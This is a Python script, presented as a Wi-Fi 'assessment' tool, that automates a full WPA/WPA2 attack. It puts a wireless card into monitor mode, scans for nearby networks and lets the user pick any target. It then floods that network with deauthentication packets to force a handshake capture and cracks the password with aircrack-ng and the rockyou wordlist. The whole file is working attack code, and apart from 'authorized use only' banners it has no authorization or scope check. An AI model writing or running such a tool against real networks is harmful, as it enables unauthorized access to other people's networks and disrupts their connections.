#!/usr/bin/env python3
"""
Wi-Fi Network Assessment Automation Tool
For authorized security testing only

This tool automates the process of:
1. Scanning for Wi-Fi networks
2. Capturing handshakes from target networks
3. Attempting to crack WPA/WPA2 passwords using wordlists

Usage: sudo python3 wifi_assessment.py
"""

import subprocess
import os
import sys
import time
import re
import argparse
from datetime import datetime

__version__ = "1.0.0"
__author__ = "Security Researcher"

class WiFiAssessmentTool:
    def __init__(self, username="hackearth"):
        self.interface = None
        self.username = username
        self.home_dir = f"/home/{username}"
        self.capture_dir = f"{self.home_dir}/wifi_captures"
        self.default_wordlist = "/usr/share/wordlists/rockyou.txt"
        self.verbose = False
        
    def log(self, message):
        """Print verbose messages when enabled"""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")

    def check_root_privileges(self):
        """Check if running with root privileges"""
        if os.geteuid() != 0:
            print("Error: This script requires root privileges")
            print("Please run with sudo: sudo python3 wifi_assessment.py")
            sys.exit(1)

    def check_dependencies(self):
        """Verify required tools are installed"""
        tools = ['aircrack-ng', 'airmon-ng', 'airodump-ng', 'aireplay-ng']
        missing = []
        
        print("[+] Checking dependencies...")
        for tool in tools:
            result = subprocess.run(['which', tool], 
                                  capture_output=True, 
                                  text=True)
            if result.returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"[-] Missing tools: {', '.join(missing)}")
            print("Install with: sudo apt install aircrack-ng")
            return False
        else:
            print("[+] All dependencies satisfied")
            return True

    def detect_wireless_interface(self):
        """Automatically detect wireless interface"""
        self.log("Detecting wireless interface...")
        try:
            result = subprocess.run(['iwconfig'], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=10)
            
            # Use regex to find wireless interfaces
            interfaces = re.findall(r'(\w+\d+)\s+IEEE', result.stdout)
            if interfaces:
                self.interface = interfaces[0]
                print(f"[+] Found wireless interface: {self.interface}")
                return True
            else:
                print("[-] No wireless interface found")
                return False
        except subprocess.TimeoutExpired:
            print("[-] Interface detection timed out")
            return False
        except Exception as e:
            print(f"[-] Error detecting interface: {e}")
            return False

    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        self.log("Enabling monitor mode...")
        try:
            print("[*] Killing interfering processes...")
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL)
            
            print(f"[*] Enabling monitor mode on {self.interface}...")
            result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                                  capture_output=True, 
                                  text=True)
            
            if result.returncode == 0:
                # Interface name typically changes to [interface]mon
                self.interface = f"{self.interface}mon"
                print(f"[+] Monitor mode enabled: {self.interface}")
                return True
            else:
                print("[-] Failed to enable monitor mode")
                print(result.stderr[:200])  # Show first 200 chars of error
                return False
                
        except Exception as e:
            print(f"[-] Error enabling monitor mode: {e}")
            return False

    def disable_monitor_mode(self):
        """Disable monitor mode and restore network manager"""
        self.log("Disabling monitor mode...")
        try:
            if self.interface and 'mon' in self.interface:
                subprocess.run(['sudo', 'airmon-ng', 'stop', self.interface], 
                              stdout=subprocess.DEVNULL, 
                              stderr=subprocess.DEVNULL)
            
            # Restart network manager
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL)
            print("[+] Monitor mode disabled and NetworkManager restored")
        except:
            pass  # Silent failure on cleanup

    def scan_networks(self, duration=15):
        """Scan for available Wi-Fi networks"""
        print(f"[*] Scanning for networks ({duration}s)...")
        try:
            temp_file = '/tmp/wifi_scan_temp'
            
            # Start scanning process
            scan_process = subprocess.Popen([
                'sudo', 'airodump-ng', 
                '--output-format', 'csv',
                '--write', temp_file,
                self.interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for specified duration
            time.sleep(duration)
            scan_process.terminate()
            
            # Parse the CSV file
            csv_files = [f for f in os.listdir('/tmp/') 
                        if f.startswith('wifi_scan_temp') and f.endswith('.csv')]
            
            if not csv_files:
                print("[-] No scan data found")
                return []
            
            # Process the most recent CSV file
            csv_file = f"/tmp/{sorted(csv_files)[-1]}"
            networks = self._parse_csv_file(csv_file)
            
            # Cleanup
            for f in csv_files:
                try:
                    os.remove(f"/tmp/{f}")
                except:
                    pass
                    
            return networks
            
        except Exception as e:
            print(f"[-] Error scanning networks: {e}")
            return []

    def _parse_csv_file(self, csv_file):
        """Parse airodump-ng CSV file for network information"""
        networks = []
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find networks section
            network_section = False
            for line in lines:
                if 'Station MAC' in line:
                    break
                if 'BSSID,First time seen' in line:
                    network_section = True
                    continue
                
                if network_section and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 14 and parts[0].strip() and ':' in parts[0]:
                        try:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            encryption = parts[5].strip()
                            essid = parts[13].strip()
                            
                            # Only include WPA/WPA2 encrypted networks with names
                            if encryption in ['WPA', 'WPA2', 'WPA WPA2'] and essid:
                                networks.append({
                                    'bssid': bssid,
                                    'channel': channel,
                                    'essid': essid,
                                    'encryption': encryption
                                })
                        except:
                            continue  # Skip malformed entries
        except Exception as e:
            self.log(f"Parsing error: {e}")
            
        return networks

    def display_networks(self, networks):
        """Display available networks in table format"""
        if not networks:
            print("[-] No networks found")
            return False

        print("\n[+] Available Networks:")
        print("=" * 80)
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<20} {'Channel':<8} {'Encryption'}")
        print("-" * 80)
        
        for i, net in enumerate(networks, 1):
            # Truncate long SSIDs
            essid_display = net['essid'][:24] + '..' if len(net['essid']) > 24 else net['essid']
            print(f"{i:<3} {essid_display:<25} {net['bssid']:<20} {net['channel']:<8} {net['encryption']}")
        
        print("=" * 80)
        return True

    def select_target_network(self, networks):
        """Allow user to select a target network"""
        try:
            while True:
                choice = input("\nSelect target network (#) or 'q' to quit: ").strip()
                
                if choice.lower() == 'q':
                    return None
                
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(networks):
                        return networks[idx]
                    else:
                        print("[-] Invalid selection. Please try again.")
                except ValueError:
                    print("[-] Please enter a valid number.")
                    
        except KeyboardInterrupt:
            print("\n[*] Selection cancelled")
            return None

    def capture_handshake(self, target, capture_duration=60):
        """Capture handshake for target network"""
        print(f"\n[*] Capturing handshake for '{target['essid']}'...")
        print(f"[*] Duration: {capture_duration} seconds")
        print("[*] This process may take a few minutes")
        
        # Create capture directory
        os.makedirs(self.capture_dir, exist_ok=True)
        
        # Generate unique filename based on timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        essid_safe = re.sub(r'[^\w\-_\.]', '_', target['essid'])
        capture_base = f"{self.capture_dir}/{essid_safe}_{timestamp}"
        
        try:
            # Start packet capture
            print("[*] Starting packet capture...")
            capture_process = subprocess.Popen([
                'sudo', 'airodump-ng',
                '-c', target['channel'],
                '--bssid', target['bssid'],
                '--write', capture_base,
                self.interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Send deauthentication packets periodically
            deauth_cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', '10',
                '-a', target['bssid'],
                self.interface
            ]
            
            # Monitor and send deauth packets
            start_time = time.time()
            deauth_count = 0
            
            while time.time() - start_time < capture_duration:
                # Send deauth every 8 seconds
                if (time.time() - start_time) // 8 > deauth_count:
                    deauth_count += 1
                    print(f"[+] Sending deauth packets... ({deauth_count})")
                    try:
                        subprocess.run(deauth_cmd, 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL,
                                     timeout=5)
                    except subprocess.TimeoutExpired:
                        pass  # Continue if deauth takes too long
                
                time.sleep(1)  # Check every second
            
            # Terminate capture process
            capture_process.terminate()
            
            # Check for capture file
            cap_file = f"{capture_base}-01.cap"
            if os.path.exists(cap_file):
                print(f"[+] Capture completed: {cap_file}")
                return cap_file
            else:
                print("[-] No capture file created")
                return None
                
        except KeyboardInterrupt:
            print("\n[*] Capture interrupted by user")
            try:
                capture_process.terminate()
            except:
                pass
            return None
        except Exception as e:
            print(f"[-] Error during capture: {e}")
            return None

    def crack_handshake(self, cap_file, wordlist=None):
        """Attempt to crack captured handshake"""
        wordlist_path = wordlist or self.default_wordlist
        
        print(f"\n[*] Attempting to crack handshake...")
        print(f"[*] Using wordlist: {os.path.basename(wordlist_path)}")
        
        # Verify wordlist exists
        if not os.path.exists(wordlist_path):
            # Try compressed version
            gz_path = f"{wordlist_path}.gz"
            if os.path.exists(gz_path):
                print("[*] Extracting compressed wordlist...")
                try:
                    subprocess.run(['sudo', 'gunzip', gz_path])
                except Exception as e:
                    print(f"[-] Failed to extract wordlist: {e}")
                    return None
            else:
                print(f"[-] Wordlist not found: {wordlist_path}")
                return None
        
        # Check if capture file has handshakes
        try:
            check_result = subprocess.run([
                'aircrack-ng', cap_file
            ], capture_output=True, text=True, timeout=30)
            
            if "0 handshake" in check_result.stdout:
                print("[-] No valid handshake found in capture")
                return None
                
        except Exception as e:
            print(f"[-] Error checking capture file: {e}")
            return None
        
        try:
            print("[*] Starting cracking process...")
            # Run aircrack-ng
            crack_process = subprocess.run([
                'aircrack-ng',
                '-w', wordlist_path,
                cap_file
            ], capture_output=True, text=True, timeout=300)  # 5 minute timeout
            
            output = crack_process.stdout
            
            # Check for success
            if "KEY FOUND" in output:
                # Extract password
                match = re.search(r'KEY FOUND.*\[(.*?)\]', output)
                if match:
                    password = match.group(1)
                    print("[+] SUCCESS: Password cracked!")
                    return password
                else:
                    return "[Key found but couldn't extract]"
            else:
                print("[-] Password not found in wordlist")
                # Show top matching candidates if any
                lines = output.split('\n')
                for line in lines[-10:]:  # Show last 10 lines
                    if line.strip() and "%" in line:
                        print(f"[~] Progress info: {line.strip()}")
                return None
                
        except subprocess.TimeoutExpired:
            print("[-] Cracking timed out (likely complex password)")
            return None
        except Exception as e:
            print(f"[-] Error during cracking: {e}")
            return None

    def run_assessment(self):
        """Main execution workflow"""
        print("Wi-Fi Network Security Assessment Tool v{}".format(__version__))
        print("=" * 50)
        print("FOR AUTHORIZED SECURITY TESTING ONLY")
        print("=" * 50)
        
        # Check prerequisites
        self.check_root_privileges()
        
        if not self.check_dependencies():
            return False
        
        try:
            # Detect and configure interface
            if not self.detect_wireless_interface():
                return False
            
            if not self.enable_monitor_mode():
                return False
            
            # Scan for networks
            networks = self.scan_networks()
            
            if not self.display_networks(networks):
                return False
            
            # Select target
            target = self.select_target_network(networks)
            if not target:
                return False
            
            print(f"\n[+] Selected target: {target['essid']}")
            
            # Capture handshake
            cap_file = self.capture_handshake(target)
            if not cap_file:
                print("[-] Failed to capture valid handshake")
                return False
            
            # Attempt to crack
            password = self.crack_handshake(cap_file)
            
            if password:
                print("\n" + "="*50)
                print("PASSWORD CRACKED SUCCESSFULLY!")
                print("="*50)
                print(f"Network: {target['essid']}")
                print(f"BSSID:   {target['bssid']}")
                print(f"Password: {password}")
                print("="*50)
                return True
            else:
                print("\n[-] Assessment completed - password not recovered")
                print("This could mean:")
                print("  1. Password not in wordlist")
                print("  2. Strong password requiring more sophisticated methods")
                print("  3. No valid handshake captured")
                return False
                
        except KeyboardInterrupt:
            print("\n[*] Assessment interrupted by user")
            return False
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            return False
        finally:
            # Always cleanup
            self.disable_monitor_mode()

def main():
    parser = argparse.ArgumentParser(
        description="Wi-Fi Network Security Assessment Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 wifi_assessment.py               # Run interactive assessment
  sudo python3 wifi_assessment.py -v            # Run with verbose output
  
WARNING:
  This tool is for authorized security testing only.
  Unauthorized access to computer networks is illegal.
        """
    )
    
    parser.add_argument('-v', '--verbose', 
                       action='store_true',
                       help='Enable verbose output')
    
    parser.add_argument('--version', 
                       action='version',
                       version=f'%(prog)s {__version__}')
    
    args = parser.parse_args()
    
    # Initialize tool
    tool = WiFiAssessmentTool()
    tool.verbose = args.verbose
    
    # Run assessment
    success = tool.run_assessment()
    
    # Exit with appropriate code
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
